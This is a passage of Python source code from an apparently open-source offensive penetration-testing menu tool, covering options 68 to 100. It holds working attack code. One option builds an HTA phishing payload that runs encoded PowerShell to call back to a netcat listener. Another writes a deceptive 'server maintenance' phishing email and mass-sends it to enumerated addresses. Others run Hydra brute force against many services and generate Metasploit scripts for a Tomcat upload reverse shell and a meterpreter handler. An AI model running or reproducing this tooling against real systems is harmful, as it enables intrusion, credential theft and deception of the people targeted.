# -------------------------------------------------------------------------------------

   if selection =='68':
      command("nano " + dataDir + "/passwords.txt")      
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Editor  hashes.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='69':
      command("nano " + dataDir + "/hashes.txt")                 
      
      for x in range (0, maxUser):
            HASH[x] = linecache.getline(dataDir + "/hashes.txt", x + 1).rstrip(" ")
            HASH[x] = spacePadding(HASH[x], COL4)            
      wipeTokens(VALD)                              
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Editor hosts.conf
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='70':
      command("nano /etc/hosts")
      prompt()    

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - SSH GEN GENERATION
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='71':
      print(colored("[*] Generating Keys...\n", colour3))
      command("ssh-keygen -t rsa -b 4096 -N '' -f './id_rsa' >/dev/null 2>&1")
      command("tput setaf 2; tput bold")
      command("cat id_rsa.pub")
      command("tput sgr0; tput dim")
      print("[+] Now insert the above into authorized_keys on the victim's machine...")      
      
      if USR[:2] == "''":
         print("[+] Then ssh login with this command:- ssh -i id_rsa user@" + TIP.rstrip(" ") +"...")
      else:
         print("[+] Then ssh login with this command:- ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='72':
      checkParams = test_IP()    
        
      if checkParams != 1:
         if WEB[:5] != "EMPTY":
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + WEB.rstrip(" ") + " 2>&1")
            print("[+] User list generated via website...")
         else:
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " 2>&1")
            print("[+] User list generated via ip address...")         
         fileCheck(dataDir + "/usernames.txt")
         
         for x in range (0,maxUser):
            USER[x] = linecache.getline(dataDir + "/usernames.txt", x+1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)            
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='73':
      checkParams = test_IP()           
      
      if checkParams != 1:
         if WEB[:5] != "EMPTY":
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt " + WEB.rstrip(" ") + " 2>&1")
            print("[+] Password list generated via website...")
         else:
            command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt " + TIP.rstrip(" ") + " 2>&1")
            print("[+] Password list generated via ip address...")            
         fileCheck(dataDir + "/passwords.txt")         
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Manual Phising...
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='74':
      checkParams = getPort()      
      
      if HTTP == 0:
         print("[-] You need to start the HTTP server first...")
         checkParams = 1      
         
      if checkParams != 1:    
         print(colored("[*] Starting phishing server...", colour3))      
         command("xdotool key Ctrl+Shift+T")
         command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
         banner("BANNER5")
         command("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
         command("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")
         command("xdotool key Ctrl+Tab")            
         payLoad = f"""      
         a=new ActiveXObject("WScript.Shell");
         a.run("powershell -nop -w 1 -enc {powershell(localIP, checkParams)}", 0);window.close();
         """.encode()            
         bpayLoad = base64.b64encode(payLoad)
         final = encrypt(bpayLoad)         
         
         with open('payrise.hta', 'w') as hta:
            hta.write(body(final))         
         print("[+] Exploit created, utilise the following code snippet to activate...")
         print(colored("\nhttp://" + localIP + ":" + HTTP + "/payrise.hta",colour6))          
      prompt()      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Automated phisher.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='75':
      checkParams = test_IP()
      
      if checkParams != 1:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         checkParams = test_Port("25")
         
      if checkParams != 1:
         checkParams = getPort()        
         
         if checkParams != 1:
            command('echo "Hello.\n" > body.tmp')
            command('echo "We just performed maintenance on our servers." >> body.tmp')
            command('echo "Please verify if you can still access the login page:\n" >> body.tmp')
            command('echo "\t  <img src=\""' + localIP + ":" + checkParams + '"/img\">" >> body.tmp')
            command('echo "\t  Citrix http://"' + localIP + ":" + checkParams + '"/" >> body.tmp')
            command('echo "  <a href=\"http://"' + localIP + ":" + checkParams + '"\">click me.</a>" >> body.tmp')
            command('echo "\nRegards," >> body.tmp')
            command('echo "it@"' + DOM.rstrip(" ") + '""  >> body.tmp')                  
            print(colored("[*] Created phishing email...\n", colour3))
            print(colored("Subject: Credentials/Errors\n", colour3))         
         
            with open("body.tmp", "r") as list:
               for phish in list:
                  phish = phish.rstrip("\n")
                  print(colored(phish,colour3))
               print("")            
            print(colored("[*] Checking for valid usernames, please wait...", colour3))         
            command("smtp-user-enum -U " + dataDir + "/usernames.txt -d " + DOM.rstrip(" ") + " -m RCPT " + DOM.rstrip(" ") + " 25 | grep SUCC > valid1.tmp")                 
            command("tr -cd '\11\12\15\40-\176' < valid1.tmp > valid.tmp")         
         
            match = 0                           
            with open("valid.tmp", "r") as list:			# PARSE FILE
               for line in list:
                  line.encode('ascii',errors='ignore')
                  line = line.rstrip("\n")
                  line = line.replace('[92m','')
                  line = line.replace('[00m','')
                  line = line.replace('[SUCC] ', '')
                  line = line.replace('250 OK', '')
                  line = line.replace('...', '')
                  line = line.replace(' ','')               
                  
                  if "TEST" not in line:                  
                     command("echo " + line + " >> phish.tmp")
                     match = 1                  
                     
            if match == 1: 						# SHOW FOUND PHISH
                print("[+] Found valid email addresses...\n")
                with open("phish.tmp", "r") as list:
                   for line in list:
                      line = line.rstrip("\n")
                      print(colored(line + "@" + DOM.rstrip(" "),colour6))         
                      
            print(colored("[*] Starting phishing server...", colour3))                   
            command("xdotool key Ctrl+Shift+T")
            command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
            command("xdotool type 'clear; cat " + dataDir + "/banner5.txt'; xdotool key Return")
            command("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return")
            command("xdotool key Ctrl+Tab")                  
            
            if match == 0:
               print("[-] Phish not found, phishing the list anyway..")
               
               with open(dataDir + "/usernames.txt", "r") as list:
                  for phish in list:
                     phish = phish.rstrip("\n")
                     phish = phish.strip(" ")
                     phish = phish + "@"
                     phish = phish + DOM.rstrip(" ")
                     command("swaks --to " + phish + " --from it@" + DOM.rstrip(" ") + " --header 'Subject: Credentials / Errors' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
                     print("[+] Mail sent to " + phish + "...")
            else:
               print("[-] No valid email addresses where found...")                               
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - GOBUSTER WEB ADDRESS/IP common.txt
# Modified: N/A
# Note    : Alternative dictionary - /usr/share/dirb/wordlists/common.txt
# -------------------------------------------------------------------------------------

   if selection =='76':
      checkParams = test_IP()                 
      
      if checkParams != 1:
         if WEB[:5] == "EMPTY":
            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + TIP.rstrip(" ") + " -x "   + fileExt + " -f -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50")
         else:
            if (WEB[:5] == "https") or (WEB[:5] == "HTTPS"):
               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u '" + WEB.rstrip(" ") + "' -x " + fileExt + " -f -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50") 
            else: 
               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P '" + PAS.rstrip(" ") + "' -u " + WEB.rstrip(" ") + " -x "   + fileExt + " -f -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Nikto scan
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='77':
      if IP46 == "-4":
         checkParams = test_IP()
      else:
         checkParams = test_Domain()      
         
      if checkParams != 1:
         if ":" in TIP:
            command("nikto -h " + DOM.rstrip(" "))	# IP 6 ISSUES
            checkParams = 1            
            
         if checkParams != 1:
            if WEB[:5] != "EMPTY":
               command("nikto -h " + WEB.rstrip(" "))
            else:
               command("nikto -h " + TIP.rstrip(" "))              
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Hydra bruteforce FTP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='78':
      checkParams = test_IP()      
      
      if checkParams != 1:
         checkParams = test_Port("21")      
         
      if checkParams != 1:
         fileCheck(dataDir + "/usernames.txt")  
         fileCheck(dataDir + "/passwords.txt")                     
         command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt ftp://" + TIP.rstrip(" "))            
         
         for x in range (0,maxUser):
            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)            
         wipeTokens(VALD)                      
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Hydra brute force ssh
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='79':
      checkParams = test_IP()      
      
      if checkParams != 1:
         checkParams = test_Port("22")       
         
      if checkParams != 1:
         fileCheck(dataDir + "/usernames.txt")
         fileCheck(dataDir + "/passwords.txt")           
         command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt ssh://" + TIP.rstrip(" "))            
         
         for x in range (0,maxUser):
            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)            
         wipeTokens(VALD)                              
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='80':
      checkParams = test_IP()      
      
      if checkParams != 1:
         checkParams = test_Port("25")      
         
      if checkParams != 1:
         fileCheck(dataDir + "/usernames.txt")
         fileCheck(dataDir + "/passwords.txt")                          
         command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " smtp")         
         
         for x in range (0,maxUser):
            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)            
         wipeTokens(VALD)                
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Command: hydra -l none -P rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='81':
      checkParams = test_IP()      
      
      if checkParams != 1:
         checkParams = test_Port("80")      
         
      if checkParams != 1:
         if WEB[:5] == "EMPTY":
            print("[-] Web url not specified...")
            checkParams = 1
            
      if checkParams != 1:
         try:
            null, target = WEB.split(TIP.rstrip(" "))
         except:
            print(colored("[!] WARNING!!! - Huston, we encountered a problem with the url... just letting you know!!...", colour0))
            checkParams = 1
            
      if checkParams != 1:
         fileCheck(dataDir + "/usernames.txt")
         fileCheck(dataDir + "/passwords.txt")
         
         for x in range (0,maxUser):
            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)            
         wipeTokens(VALD)       
         
      if checkParams != 1:
         command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " http-post-form '" + target.rstrip(" ") + ":username=^USER^&password=^PASS^:Invalid' -t 64 -V")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Hydra SMB bruteforce
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='82':
      checkParams = test_IP()      
      
      if checkParams != 1:
         checkParams = test_Port("445")           
         
      if checkParams != 1:
         fileCheck(dataDir + "/usernames.txt")
         fileCheck(dataDir + "/passwords.txt")                          
         command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " smb -V -f")            
         
         for x in range (0,maxUser):
            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)            
         wipeTokens(VALD)                     
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - hydra pop3 bruteforce uses port 110 & pop3s?
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='83':
      checkParams = test_IP()      
      
      if checkParams != 1:
         checkParams = test_Port("110")      
         
      if checkParams != 1:
         fileCheck(dataDir + "/usernames.txt")
         fileCheck(dataDir + "/passwords.txt")                          
         command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " pop3")         
         
         for x in range (0,maxUser):
            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)            
         wipeTokens(VALD)                
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - hydra rdp bruteforce uses port 3389
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='84':
      checkParams = test_IP()      
      
      if checkParams != 1:
         checkParams = test_Port("3389")      
         
      if checkParams != 1:
         fileCheck(dataDir + "/usernames.txt")
         fileCheck(dataDir + "/passwords.txt")                          
         command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " rdp")         
         
         for x in range (0,maxUser):
            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)            
         wipeTokens(VALD)                
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Hydra tomcat classic bruteforce
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='85':  
      if WEB[:5] != "EMPTY":
         print(colored("[*] Attempting a classic tomcat bruteforce againt the specified web address, please wait...", colour3))         
         command("rm " + dataDir + "/usernames.txt")
         command("rm " + dataDir + "/passwords.txt")
         wipeTokens(VALD)          
         
         with open('/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt', 'r') as userpasslist:
            for line in userpasslist:
               one, two = line.strip().split(':')
               command("echo " + one + " >> usernames.tmp")
               command("echo " + two + " >> passwords.tmp")                              
            command("cat usernames.tmp | sort -u > " + dataDir + "/usernames.txt")
            command("cat passwords.tmp | sort -u > " + dataDir + "/passwords.txt")
         
         if "http://" in WEB.lower():
            target = WEB.replace("http://","")
            command("hydra -L " + dataDir + "/usernames.txt -P " + dataDir + "/passwords.txt http-get://" + target.rstrip(" "))                     
         
         if "https://" in WEB.lower():
            target = target.replace("https://","")
            command("hydra -L " + dataDir + "/usernames.txt -P " + dataDir + "/passwords.txt https-get://" + target.rstrip(" "))             
         
         for x in range (0,maxUser):
            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)            
      else:
         print("[-] Web address has not been specified...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Start metersploit tomcat classic exploit
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='86':
      checkParms = test_Port("80")      
      
      if checkParams != 1:
         print(colored("[*] Starting metasploit server...", colour3))         
         
         with open("meterpreter.rc", "w") as write:
            write.write("use exploit/multi/http/tomcat_mgr_upload\n")
            write.write("set RHOSTS " + TIP.rstrip(" ") + "\n")
            DATA = PAS.rstrip(" ")
            write.write("set HttpPassword " + DATA + "\n")
            DATA = USR.rstrip(" ")
            write.write("set HttpUsername " + DATA + "\n")
            write.write("set payload java/shell_reverse_tcp\n")
            command("hostname -I >> temp.tmp")
            target = linecache.getline("temp.tmp",1)
            one, two, three, four = target.split(" ")
            target = two.rstrip(" ")
            write.write("set lhost " + target + "\n")
            write.write("clear\n")
            write.write("cat banner.tmp\n")
            write.write("run\n")   
            
         command("xdotool key Ctrl+Shift+T")
         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER TOMCAT'; xdotool key Return")
         banner("METERPRETER") 
         command("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
         command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
         command("xdotool key Ctrl+Tab")
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '87':
      checkParms = test_Port("443")      
      
      if checkParams != 1:
         print(colored("[*] Starting metasploit server...", colour3))         
         
         with open("meterpreter.rc", "w") as write:
            write.write("use auxiliary/scanner/http/owa_ews_login\n")
            write.write("set RHOSTS " + TIP.rstrip(" ") + "\n")
            write.write("set USER_FILE " + dataDir + "/usernames.txt\n")
            write.write("set PASS_FILE " + dataDir + "/passwords.txt\n")
            write.write("set lhost " + localIP + "\n")
            write.write("run\n")   
            
         command("xdotool key Ctrl+Shift+T")
         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER OWA'; xdotool key Return")
         banner("METERPRETER") 
         command("xdotool type 'cat banner.tmp'; xdotool key Return")
         command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
         command("xdotool key Ctrl+Tab")

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Start metersploit shell server
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='88':
      checkParams = getPort()
      
      if checkParams != 1:       

         with open("meterpreter.rc", "w") as write:
            write.write("use exploit/multi/handler\n")
            write.write("set PAYLOAD /windows/x64/meterpreter/reverse_https\n")
            write.write("set LHOST " + localIP + "\n")
            write.write("set LPORT " + checkParams + "\n")
            write.write("run\n")            

         command("xdotool key Ctrl+Shift+T")
         command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return")
         banner("METERPRETER")
         command("xdotool type 'cat banner.tmp'; xdotool key Return")
         command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
         command("xdotool key Ctrl+Tab")
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - FTP uses port 21
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='89':
      checkParams = test_IP()      
      
      if checkParams != 1:
         checkParams = test_Port("21")        
         
      if checkParams != 1:
         command("ftp " + TIP.rstrip(" ") + " 21")
      prompt()       
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Ssh uses port 22
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='90':
      checkParams = test_IP()      
      
      if checkParams != 1:
         checkParams = test_Port("22")        
         
      if checkParams != 1:
         command("sshpass -p '" + PAS.rstrip(" ") + "' ssh -o 'StrictHostKeyChecking no' " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Ssh id_rsa use port 22
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='91':
      checkParams = test_IP()      
      
      if checkParams != 1:
         checkParams = test_Port("22")      
         
      if checkParams != 1:
         command("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -p 22")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Telnet uses port 23
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='92':
      checkParams = test_IP()            
      
      if checkParams != 1:
         checkParams = test_Port("23")        
         
      if checkParams != 1:
         command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " 23")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - NC uses random port number
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='93':
      checkParams = test_IP()      
      
      if checkParams != 1:
         checkParams = getPort()      
         
      if checkParams != 1:
         command("nc " + TIP.rstrip(" ") + " " + checkParams)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - SQSH uses port 1433
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='94':
      checkParams = test_IP()      
      
      if checkParams != 1:
         checkParams = test_Port("1433")        
         
      if checkParams != 1:
         command("sqsh -S " + TIP.rstrip(" ") + " -L user=" + USR.rstrip(" ") + " -L password=" + PAS.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - MSSQLCLIENT uses port 1433
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='95':
      checkParams = test_Domain()      
      
      if checkParams != 1:
         checkParams = test_Port("1433")      
         
      if checkParams != 1:
         if PAS[:1] != " ":
            command(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -windows-auth")
         else:
            if NTM[:1] != " ":
               print("[i] Using HASH value as password credential...")
               command(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes " + NTM.rstrip(" ") + " -windows-auth")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - MYSQL Login uses port 3306
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='96':
      checkParams = test_IP()            
      
      if checkParams != 1:
         checkParams = test_Port("3306")        
         
      if checkParams != 1:
         command("mysql -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -h " + TIP.rstrip(" "))
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - WINRM remote login uses PORT 5985
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='97':
      if IP46 == "-4":
         checkParams = test_IP()
      else:
         checkParams = test_Domain()         
         
      if checkParams != 1:
         checkParams = test_Port("5985")       
         
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using the HASH value as a password credential...")
            if IP46 == "-4":
               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
            else:
               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
         else:
            if IP46 == "-4":
               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")            
            else:
               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Xfreeredp port number 3389
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '98':
      checkParams = test_IP()      
      
      if checkParams != 1:
         checkParams = test_Port("3389")            
         
      if checkParams != 1:
         command("xfreerdp /u:" + USR.rstrip(" ") + " /p:" + PAS.rstrip(" ") + " /v:" + TIP.rstrip(" "))
      prompt()             
                 
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Save running config to config.txt and exit program
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '99':        
      saveParams()
      command("rm *.tmp")            
      
      if DOMC == 1:
         print("[+] Removing domain name from /etc/hosts...")
         command("sed -i '$d' /etc/hosts")              
         
      if DNSC == 1:
         print("[+] Removing dns server from /etc/resolv.conf...")
         command("sed -i '$d' /etc/resolv.conf")              
         
      connection.close()
      print(colored("[*] Program sucessfully terminated...", colour3))
      exit(1)        
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Secret option
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '100':
      print("")  	     # REFRESH SCREEN
      
# Eof...	
